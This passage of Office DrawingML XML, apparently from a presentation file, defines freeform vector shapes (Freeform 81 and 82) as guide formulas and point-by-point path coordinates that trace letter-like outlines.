                    <a:pt x="0" y="51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0" y="33"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4" y="25"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8" y="18"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="6"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="31" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="41" y="0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72" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="72" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="83" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="83" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="89" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="97" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="95" y="49"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="83" y="49"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="83" y="49"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="81" y="31"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="77" y="23"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="18"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="70" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="8"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58" y="6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41" y="8"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="33" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27" y="20"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="29"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="29"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="33"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27" y="39"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="35" y="47"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="35" y="47"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="42" y="51"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="66" y="62"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="66" y="62"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="83" y="72"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="95" y="82"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="99" y="88"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="101" y="93"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="103" y="107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="103" y="107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="103" y="117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="99" y="126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="95" y="134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="89" y="142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="83" y="146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52" y="153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52" y="153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="42" y="153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13" y="150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13" y="150"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2" y="1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0" name="Freeform 81">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E949008D-E905-48D6-BB95-C34578B500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23242" y="4741141"/>
              <a:ext cx="36179" cy="99261"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 58 w 78"/>
                <a:gd name="T1" fmla="*/ 64 h 214"/>
                <a:gd name="T2" fmla="*/ 58 w 78"/>
                <a:gd name="T3" fmla="*/ 64 h 214"/>
                <a:gd name="T4" fmla="*/ 56 w 78"/>
                <a:gd name="T5" fmla="*/ 119 h 214"/>
                <a:gd name="T6" fmla="*/ 56 w 78"/>
                <a:gd name="T7" fmla="*/ 179 h 214"/>
                <a:gd name="T8" fmla="*/ 56 w 78"/>
                <a:gd name="T9" fmla="*/ 179 h 214"/>
                <a:gd name="T10" fmla="*/ 56 w 78"/>
                <a:gd name="T11" fmla="*/ 194 h 214"/>
                <a:gd name="T12" fmla="*/ 58 w 78"/>
                <a:gd name="T13" fmla="*/ 198 h 214"/>
                <a:gd name="T14" fmla="*/ 60 w 78"/>
                <a:gd name="T15" fmla="*/ 202 h 214"/>
                <a:gd name="T16" fmla="*/ 62 w 78"/>
                <a:gd name="T17" fmla="*/ 204 h 214"/>
                <a:gd name="T18" fmla="*/ 66 w 78"/>
                <a:gd name="T19" fmla="*/ 206 h 214"/>
                <a:gd name="T20" fmla="*/ 78 w 78"/>
                <a:gd name="T21" fmla="*/ 206 h 214"/>
                <a:gd name="T22" fmla="*/ 78 w 78"/>
                <a:gd name="T23" fmla="*/ 214 h 214"/>
                <a:gd name="T24" fmla="*/ 0 w 78"/>
                <a:gd name="T25" fmla="*/ 214 h 214"/>
                <a:gd name="T26" fmla="*/ 0 w 78"/>
                <a:gd name="T27" fmla="*/ 206 h 214"/>
                <a:gd name="T28" fmla="*/ 0 w 78"/>
                <a:gd name="T29" fmla="*/ 206 h 214"/>
                <a:gd name="T30" fmla="*/ 12 w 78"/>
                <a:gd name="T31" fmla="*/ 206 h 214"/>
                <a:gd name="T32" fmla="*/ 15 w 78"/>
                <a:gd name="T33" fmla="*/ 204 h 214"/>
                <a:gd name="T34" fmla="*/ 17 w 78"/>
                <a:gd name="T35" fmla="*/ 202 h 214"/>
                <a:gd name="T36" fmla="*/ 19 w 78"/>
                <a:gd name="T37" fmla="*/ 198 h 214"/>
                <a:gd name="T38" fmla="*/ 21 w 78"/>
                <a:gd name="T39" fmla="*/ 194 h 214"/>
                <a:gd name="T40" fmla="*/ 21 w 78"/>
                <a:gd name="T41" fmla="*/ 179 h 214"/>
                <a:gd name="T42" fmla="*/ 21 w 78"/>
                <a:gd name="T43" fmla="*/ 101 h 214"/>
                <a:gd name="T44" fmla="*/ 21 w 78"/>
                <a:gd name="T45" fmla="*/ 101 h 214"/>
                <a:gd name="T46" fmla="*/ 21 w 78"/>
                <a:gd name="T47" fmla="*/ 87 h 214"/>
                <a:gd name="T48" fmla="*/ 19 w 78"/>
                <a:gd name="T49" fmla="*/ 78 h 214"/>
                <a:gd name="T50" fmla="*/ 15 w 78"/>
                <a:gd name="T51" fmla="*/ 76 h 214"/>
                <a:gd name="T52" fmla="*/ 12 w 78"/>
                <a:gd name="T53" fmla="*/ 76 h 214"/>
                <a:gd name="T54" fmla="*/ 0 w 78"/>
                <a:gd name="T55" fmla="*/ 74 h 214"/>
                <a:gd name="T56" fmla="*/ 0 w 78"/>
                <a:gd name="T57" fmla="*/ 68 h 214"/>
                <a:gd name="T58" fmla="*/ 58 w 78"/>
                <a:gd name="T59" fmla="*/ 64 h 214"/>
                <a:gd name="T60" fmla="*/ 39 w 78"/>
                <a:gd name="T61" fmla="*/ 0 h 214"/>
                <a:gd name="T62" fmla="*/ 39 w 78"/>
                <a:gd name="T63" fmla="*/ 0 h 214"/>
                <a:gd name="T64" fmla="*/ 47 w 78"/>
                <a:gd name="T65" fmla="*/ 2 h 214"/>
                <a:gd name="T66" fmla="*/ 54 w 78"/>
                <a:gd name="T67" fmla="*/ 6 h 214"/>
                <a:gd name="T68" fmla="*/ 58 w 78"/>
                <a:gd name="T69" fmla="*/ 12 h 214"/>
                <a:gd name="T70" fmla="*/ 60 w 78"/>
                <a:gd name="T71" fmla="*/ 20 h 214"/>
                <a:gd name="T72" fmla="*/ 60 w 78"/>
                <a:gd name="T73" fmla="*/ 20 h 214"/>
                <a:gd name="T74" fmla="*/ 58 w 78"/>
                <a:gd name="T75" fmla="*/ 27 h 214"/>
                <a:gd name="T76" fmla="*/ 54 w 78"/>
                <a:gd name="T77" fmla="*/ 33 h 214"/>
                <a:gd name="T78" fmla="*/ 47 w 78"/>
                <a:gd name="T79" fmla="*/ 39 h 214"/>
                <a:gd name="T80" fmla="*/ 39 w 78"/>
                <a:gd name="T81" fmla="*/ 39 h 214"/>
                <a:gd name="T82" fmla="*/ 39 w 78"/>
                <a:gd name="T83" fmla="*/ 39 h 214"/>
                <a:gd name="T84" fmla="*/ 31 w 78"/>
                <a:gd name="T85" fmla="*/ 39 h 214"/>
                <a:gd name="T86" fmla="*/ 25 w 78"/>
                <a:gd name="T87" fmla="*/ 33 h 214"/>
                <a:gd name="T88" fmla="*/ 21 w 78"/>
                <a:gd name="T89" fmla="*/ 27 h 214"/>
                <a:gd name="T90" fmla="*/ 19 w 78"/>
                <a:gd name="T91" fmla="*/ 20 h 214"/>
                <a:gd name="T92" fmla="*/ 19 w 78"/>
                <a:gd name="T93" fmla="*/ 20 h 214"/>
                <a:gd name="T94" fmla="*/ 21 w 78"/>
                <a:gd name="T95" fmla="*/ 12 h 214"/>
                <a:gd name="T96" fmla="*/ 25 w 78"/>
                <a:gd name="T97" fmla="*/ 6 h 214"/>
                <a:gd name="T98" fmla="*/ 31 w 78"/>
                <a:gd name="T99" fmla="*/ 2 h 214"/>
                <a:gd name="T100" fmla="*/ 39 w 78"/>
                <a:gd name="T101" fmla="*/ 0 h 214"/>
                <a:gd name="T102" fmla="*/ 39 w 78"/>
                <a:gd name="T103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8" h="214">
                  <a:moveTo>
                    <a:pt x="58" y="64"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="58" y="64"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56" y="119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56" y="179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56" y="179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56" y="194"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58" y="198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="60" y="202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="66" y="206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="78" y="206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="78" y="214"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="214"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12" y="206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="194"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="87"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="78"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="76"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12" y="76"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="68"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58" y="64"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="39" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="39" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="47" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="6"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="60" y="20"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="60" y="20"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58" y="27"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="33"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="47" y="39"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="39" y="39"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="39" y="39"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="31" y="39"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="33"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="27"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="20"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="20"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="6"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="31" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="39" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3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1" name="Freeform 82">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E86C1D78-701A-4D95-B1F3-D58A7EA51F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68234" y="4770827"/>
              <a:ext cx="64009" cy="98333"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 105 w 138"/>
                <a:gd name="T1" fmla="*/ 128 h 212"/>
                <a:gd name="T2" fmla="*/ 122 w 138"/>
                <a:gd name="T3" fmla="*/ 132 h 212"/>
                <a:gd name="T4" fmla="*/ 138 w 138"/>
                <a:gd name="T5" fmla="*/ 152 h 212"/>
                <a:gd name="T6" fmla="*/ 138 w 138"/>
                <a:gd name="T7" fmla="*/ 173 h 212"/>
                <a:gd name="T8" fmla="*/ 118 w 138"/>
                <a:gd name="T9" fmla="*/ 198 h 212"/>
                <a:gd name="T10" fmla="*/ 95 w 138"/>
                <a:gd name="T11" fmla="*/ 208 h 212"/>
                <a:gd name="T12" fmla="*/ 64 w 138"/>
                <a:gd name="T13" fmla="*/ 212 h 212"/>
                <a:gd name="T14" fmla="*/ 25 w 138"/>
                <a:gd name="T15" fmla="*/ 206 h 212"/>
                <a:gd name="T16" fmla="*/ 4 w 138"/>
                <a:gd name="T17" fmla="*/ 192 h 212"/>
                <a:gd name="T18" fmla="*/ 0 w 138"/>
                <a:gd name="T19" fmla="*/ 177 h 212"/>
                <a:gd name="T20" fmla="*/ 12 w 138"/>
                <a:gd name="T21" fmla="*/ 159 h 212"/>
                <a:gd name="T22" fmla="*/ 15 w 138"/>
                <a:gd name="T23" fmla="*/ 148 h 212"/>
                <a:gd name="T24" fmla="*/ 4 w 138"/>
                <a:gd name="T25" fmla="*/ 134 h 212"/>
                <a:gd name="T26" fmla="*/ 4 w 138"/>
                <a:gd name="T27" fmla="*/ 119 h 212"/>
                <a:gd name="T28" fmla="*/ 17 w 138"/>
                <a:gd name="T29" fmla="*/ 105 h 212"/>
                <a:gd name="T30" fmla="*/ 21 w 138"/>
                <a:gd name="T31" fmla="*/ 89 h 212"/>
                <a:gd name="T32" fmla="*/ 10 w 138"/>
                <a:gd name="T33" fmla="*/ 80 h 212"/>
                <a:gd name="T34" fmla="*/ 4 w 138"/>
                <a:gd name="T35" fmla="*/ 53 h 212"/>
                <a:gd name="T36" fmla="*/ 8 w 138"/>
                <a:gd name="T37" fmla="*/ 31 h 212"/>
                <a:gd name="T38" fmla="*/ 29 w 138"/>
                <a:gd name="T39" fmla="*/ 8 h 212"/>
                <a:gd name="T40" fmla="*/ 64 w 138"/>
                <a:gd name="T41" fmla="*/ 0 h 212"/>
                <a:gd name="T42" fmla="*/ 85 w 138"/>
                <a:gd name="T43" fmla="*/ 2 h 212"/>
                <a:gd name="T44" fmla="*/ 136 w 138"/>
                <a:gd name="T45" fmla="*/ 2 h 212"/>
                <a:gd name="T46" fmla="*/ 109 w 138"/>
                <a:gd name="T47" fmla="*/ 14 h 212"/>
                <a:gd name="T48" fmla="*/ 124 w 138"/>
                <a:gd name="T49" fmla="*/ 41 h 212"/>
                <a:gd name="T50" fmla="*/ 122 w 138"/>
                <a:gd name="T51" fmla="*/ 62 h 212"/>
                <a:gd name="T52" fmla="*/ 107 w 138"/>
                <a:gd name="T53" fmla="*/ 89 h 212"/>
                <a:gd name="T54" fmla="*/ 89 w 138"/>
                <a:gd name="T55" fmla="*/ 99 h 212"/>
                <a:gd name="T56" fmla="*/ 66 w 138"/>
                <a:gd name="T57" fmla="*/ 103 h 212"/>
                <a:gd name="T58" fmla="*/ 41 w 138"/>
                <a:gd name="T59" fmla="*/ 99 h 212"/>
                <a:gd name="T60" fmla="*/ 27 w 138"/>
                <a:gd name="T61" fmla="*/ 115 h 212"/>
                <a:gd name="T62" fmla="*/ 35 w 138"/>
                <a:gd name="T63" fmla="*/ 124 h 212"/>
                <a:gd name="T64" fmla="*/ 78 w 138"/>
                <a:gd name="T65" fmla="*/ 126 h 212"/>
                <a:gd name="T66" fmla="*/ 31 w 138"/>
                <a:gd name="T67" fmla="*/ 155 h 212"/>
                <a:gd name="T68" fmla="*/ 25 w 138"/>
                <a:gd name="T69" fmla="*/ 171 h 212"/>
                <a:gd name="T70" fmla="*/ 29 w 138"/>
                <a:gd name="T71" fmla="*/ 186 h 212"/>
                <a:gd name="T72" fmla="*/ 43 w 138"/>
                <a:gd name="T73" fmla="*/ 200 h 212"/>
                <a:gd name="T74" fmla="*/ 70 w 138"/>
                <a:gd name="T75" fmla="*/ 204 h 212"/>
                <a:gd name="T76" fmla="*/ 95 w 138"/>
                <a:gd name="T77" fmla="*/ 200 h 212"/>
                <a:gd name="T78" fmla="*/ 111 w 138"/>
                <a:gd name="T79" fmla="*/ 186 h 212"/>
                <a:gd name="T80" fmla="*/ 113 w 138"/>
                <a:gd name="T81" fmla="*/ 175 h 212"/>
                <a:gd name="T82" fmla="*/ 107 w 138"/>
                <a:gd name="T83" fmla="*/ 161 h 212"/>
                <a:gd name="T84" fmla="*/ 70 w 138"/>
                <a:gd name="T85" fmla="*/ 153 h 212"/>
                <a:gd name="T86" fmla="*/ 64 w 138"/>
                <a:gd name="T87" fmla="*/ 95 h 212"/>
                <a:gd name="T88" fmla="*/ 80 w 138"/>
                <a:gd name="T89" fmla="*/ 89 h 212"/>
                <a:gd name="T90" fmla="*/ 87 w 138"/>
                <a:gd name="T91" fmla="*/ 70 h 212"/>
                <a:gd name="T92" fmla="*/ 87 w 138"/>
                <a:gd name="T93" fmla="*/ 31 h 212"/>
                <a:gd name="T94" fmla="*/ 80 w 138"/>
                <a:gd name="T95" fmla="*/ 12 h 212"/>
                <a:gd name="T96" fmla="*/ 64 w 138"/>
                <a:gd name="T97" fmla="*/ 6 h 212"/>
                <a:gd name="T98" fmla="*/ 52 w 138"/>
                <a:gd name="T99" fmla="*/ 8 h 212"/>
                <a:gd name="T100" fmla="*/ 43 w 138"/>
                <a:gd name="T101" fmla="*/ 23 h 212"/>
                <a:gd name="T102" fmla="*/ 39 w 138"/>
                <a:gd name="T103" fmla="*/ 49 h 212"/>
                <a:gd name="T104" fmla="*/ 45 w 138"/>
                <a:gd name="T105" fmla="*/ 84 h 212"/>
                <a:gd name="T106" fmla="*/ 58 w 138"/>
                <a:gd name="T107" fmla="*/ 9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8" h="212">
                  <a:moveTo>
                    <a:pt x="78" y="126"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="78" y="126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="105" y="128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="114" y="130"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="122" y="132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="122" y="132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="128" y="138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="134" y="144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="138" y="152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="138" y="161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="138" y="161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="138" y="173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="134" y="183"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="126" y="192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="118" y="198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="118" y="198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="107" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="95" y="208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="80" y="210"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="212"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="212"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="48" y="212"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="210"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10" y="198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4" y="192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2" y="185"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4" y="165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12" y="159"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23" y="152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23" y="152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="148"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10" y="144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10" y="144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4" y="134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2" y="124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2" y="124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4" y="119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6" y="115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10" y="111"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="105"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="31" y="95"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="31" y="95"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="89"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="86"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="86"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10" y="80"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6" y="72"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4" y="62"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4" y="53"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4" y="53"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4" y="41"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8" y="31"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14" y="22"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="14"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29" y="8"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="39" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50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85" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="85" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="105" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="105" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="136" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="136" y="14"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="109" y="14"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="109" y="14"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="114" y="23"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="120" y="31"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="124" y="41"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="124" y="53"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="124" y="53"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="122" y="62"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="120" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="114" y="82"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="107" y="89"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="107" y="89"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="99" y="95"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="89" y="99"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="78" y="101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="66" y="103"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="66" y="103"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52" y="101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="41" y="99"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="41" y="99"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="31" y="107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29" y="111"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27" y="115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27" y="115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29" y="120"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="35" y="124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="47" y="126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="78" y="126"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="35" y="153"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="35" y="153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="31" y="155"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29" y="159"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27" y="165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79"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29" y="186"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="33" y="190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="43" y="200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50" y="202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="70" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="70" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="87" y="202"/>
                  </a:lnTo>
                  <a:lnTo>
